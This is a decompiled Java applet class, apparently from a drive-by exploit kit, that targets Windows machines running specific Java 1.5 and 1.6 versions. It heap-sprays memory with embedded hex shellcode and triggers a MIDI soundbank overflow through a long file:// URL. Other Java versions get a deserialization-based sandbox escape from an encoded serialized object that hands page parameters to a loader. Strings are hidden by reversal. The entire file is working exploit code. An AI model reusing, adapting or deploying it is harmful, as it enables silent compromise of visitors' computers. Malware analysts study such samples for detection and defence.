// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

public class AdgredY extends Applet
{
    private IntBuffer[] mem;
    private static final long serialVersionUID = -3238297386635759160L;
    String cont1;
    String cont;
    private final String serializedObject;
    public static String data;
    
    public AdgredY() {
        this.cont1 = "A000CA469F2E4FFFFF8707870000208D904CDD76C4B8E58527564616F6C4E237E2675646D0002737870000000000000000200000006000E700175700000000000060000000A077F1E1F1E1F1F1E1F1E1F1C1F1C000000007870000200E4580608F713FCA24B52000275700000000000000000000000000000000000000000000000000000000002000000000C884EF00000000000000000000000000000000000000000000000008EE6300E6F637771644F21636962756D614E000470787B376E696274735F276E616C6F2166716A6C421004744942000C41000201ACA44775F9E3B1356E6F6A556D69645E2C6964757E2166716A62100278724B5200047864776E656C48647E6F6D6B000B547867696C6971644563757B000A52716569547271647379000945646F6D456D696454727164737D0009456D6964547271647379000948647E6F6D44727164737A000945646F6D44727164737900094B656567566F49716444727164737E000949716444727164737800094D61656274735E6F4E6F69637275665C616962756375100944756376666F47716279000945646F6D456D6964546E656B0009456D6964546E6567000948647E6F6D446E6568000945646F6D446E656700094B656567566F497164446E656C0009497164446E6566000943776E696671635473746A000942100306A5FE51D06D576AF56E6F6A556D6964556C607D69635E2C6964757E2166716A68100273710101010101010101010101010101010101100000007870000202ED58B419302F875A5B5200027570000000000C884EFED20000022000000110000000100000040000000100000003000000020000000A8000000210000004000000051000000400000009D700000100000001100000007870000205A2BAE676206ABD494B520002757E0CFA36512100000100000002000000010000000101010000000100787B356E6F6A556D69645F2C6964757F2166716A6C441004756E6F6A74000C4A5B520004747563537965000B594B52000473746C65696666000B556D696474000A4D61656274735E6F4E6F69637275665C6169627563751009407D6164735478756E6900094B65656754737279664E69437971644C616D696E696D661009447E65696E656C67000A547563556D6964537969000A5B656567566F49716444737279666E000944756353746C6569664562716C000A5B00030E8B5CD8CE1D4AE6E271646E656C61634E2C6964757E2166716A621002787275667F6475734E6169627F6765627760100A41000201C0D0B5E6D7DD3F8271646E656C61634E6169627F676562774E2C6964757E2166716A6B10027375000DECA";
        this.cont = new StringBuffer(this.cont1).reverse().toString();
        this.serializedObject = this.cont;
    }
    
    public void init() {
        final String string = new StringBuffer("00078607E2863716273600568756E2460757664607001456C69664F6454616F6C6E677F644C4255500C4C444E2E4F4D4C425553CDEBE2047BBE308EC10BAE5F5FFFFFF858E7565000020B158980000000000000000000000000000000001BE3C000020B15830DA6C98000020F15830200E1CDA66696F130000207258300E1D39E59EBE34E54047956A3FCF157D986C98000020B1583065DABD13E5BA000020B15830DABA05000020B15830DABA000020B15830DA000020F1DBD8000020B15B30C16C388707B8000020B15830DA66000020B15B30000000C3EB0C139F987F92DF57EA0C037F982F98BB0036568754E69675003737562746461436F627054756740014972716272696C44616F6C400148647160507D65645475674000000000000000000000000000000003C85B595A5E5F5D5D9000010A559FF25000010E52C18AE9850A60DFF00A6250000206A2C18AE9825000010E52C18AE9800A600A60000106559FF0525000020052C18AE980000102559FF25000020542C18AE980023406CEEBE6423C188604700BF08000020E653C9A82C106F13000010E52C18AE98000010E459FF000000088625000010E52C18AE98000010A559FF25000010E52C18AE9850A60DFF00A625000020872C18AE9825000010E52C18AE9800A600A60000106559FF0525000020052C18AE980000102559FF25000020542C18AE980023406CEEBE6423C188604700BF080000203653C9A82C106F13000010E52C18AE98000010E459FF000000088625000010E52C18AE98E5F50000106D8EFE10000010E4FBEE10000010E5EB7565C304B8C704D84304B890BE8004B8DAC107B8C004B8C087030430460C13D0DE38D5000000008EC955756525153505").reverse().toString();
        final String string2 = new StringBuffer("atad").reverse().toString();
        final String string3 = new StringBuffer("//:elif").reverse().toString();
        final String string4 = new StringBuffer("noisrev.avaj").reverse().toString();
        final String string5 = new StringBuffer("09090909").reverse().toString();
        final String string6 = new StringBuffer("eman.so").reverse().toString();
        final String string7 = new StringBuffer("niw").reverse().toString();
        final String property = System.getProperty(string4);
        final String parameter = this.getParameter(string2);
        final char[] array = { '?' };
        int n = 0;
        char c = '\0';
        while (parameter.charAt(n) != array[0]) {
            c += parameter.charAt(n);
            ++n;
        }
        if (parameter.indexOf("deserialize=" + Integer.toHexString((c + '\u0007') % '\u0100')) == -1) {
            return;
        }
        if ((property.indexOf("1.6.0_11") != -1 || property.indexOf("1.6.0_12") != -1 || property.indexOf("1.6.0_13") != -1 || property.indexOf("1.6.0_14") != -1 || property.indexOf("1.6.0_15") != -1 || property.indexOf("1.6.0_16") != -1) & parameter.indexOf("i=1") == -1) {
            repeat('/', 303);
            if (System.getProperty(string6).toLowerCase().indexOf(string7) < 0) {
                return;
            }
            final String string8 = string3 + repeat('/', 302) + "Z%Z%Z%Z%Z%Z%";
            try {
                final String string9 = this.getParameter(string2) + "11";
                String s = "";
                for (int i = 0; i < string9.length(); ++i) {
                    s += Integer.toHexString(string9.charAt(i));
                }
                while (s.length() % 8 != 0) {
                    s += "26";
                }
                this.mem = this.spray(string + s, string5);
                final URL url = new URL(string8);
                MidiSystem.getSequencer();
                MidiSystem.getSoundbank(url);
                MidiSystem.getSequencer();
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception ex) {
                System.out.println(ex);
            }
        }
        Label_1081: {
            if (property != "1.5.0" && property.indexOf("1.5.0_01") == -1 && property.indexOf("1.5.0_02") == -1 && property.indexOf("1.5.0_03") == -1 && property.indexOf("1.5.0_04") == -1 && property.indexOf("1.5.0_05") == -1 && property.indexOf("1.5.0_06") == -1 && property.indexOf("1.5.0_07") == -1 && property.indexOf("1.5.0_08") == -1 && property.indexOf("1.5.0_09") == -1 && property.indexOf("1.5.0_10") == -1 && property.indexOf("1.5.0_11") == -1 && property.indexOf("1.5.0_12") == -1 && property.indexOf("1.5.0_13") == -1 && property.indexOf("1.5.0_14") == -1 && property.indexOf("1.5.0_15") == -1 && property.indexOf("1.5.0_16") == -1 && property != "1.6.0" && property != "1.6.0_01" && property.indexOf("1.6.0_02") == -1 && property.indexOf("1.6.0_03") == -1 && property.indexOf("1.6.0_04") == -1 && property.indexOf("1.6.0_05") == -1 && property.indexOf("1.6.0_06") == -1 && property.indexOf("1.6.0_07") == -1) {
                if (property.indexOf("1.6.0_10") == -1) {
                    break Label_1081;
                }
            }
            try {
                final Object object = new ObjectInputStream(new ByteArrayInputStream(DyesyasZ.StringToBytes(this.serializedObject))).readObject();
                final String parameter2 = this.getParameter("cc");
                String parameter3 = this.getParameter(string2);
                if (object != null && LoaderX.instance != null) {
                    if (parameter3 == null) {
                        parameter3 = "";
                    }
                    LoaderX.instance.lalafa(parameter3, parameter2);
                }
            }
            catch (Exception ex3) {}
        }
        if ((property.indexOf("1.5.0_17") != -1 || property.indexOf("1.5.0_18") != -1 || property.indexOf("1.5.0_19") != -1 || property.indexOf("1.5.0_20") != -1 || property.indexOf("1.5.0_21") != -1) & parameter.indexOf("i=1") == -1) {
            repeat('/', 303);
            if (System.getProperty(string6).toLowerCase().indexOf(string7) < 0) {
                return;
            }
            final String string10 = string3 + repeat('/', 304) + "$\"$\"$\"$\"$\"$\"";
            try {
                final String string11 = this.getParameter(string2) + "11";
                String s2 = "";
                for (int j = 0; j < string11.length(); ++j) {
                    s2 += Integer.toHexString(string11.charAt(j));
                }
                while (s2.length() % 8 != 0) {
                    s2 += "26";
                }
                this.mem = this.spray(string + s2, string5);
                final URL url2 = new URL(string10);
                MidiSystem.getSequencer();
                MidiSystem.getSoundbank(url2);
                MidiSystem.getSequencer();
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception ex2) {
                System.out.println(ex2);
            }
        }
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] Engaging(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] spray(final String s, final String s2) {
        return this.spray(Engaging(s), Engaging(s2));
    }
    
    public final IntBuffer[] spray(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
    
    static {
        AdgredY.data = null;
    }
}
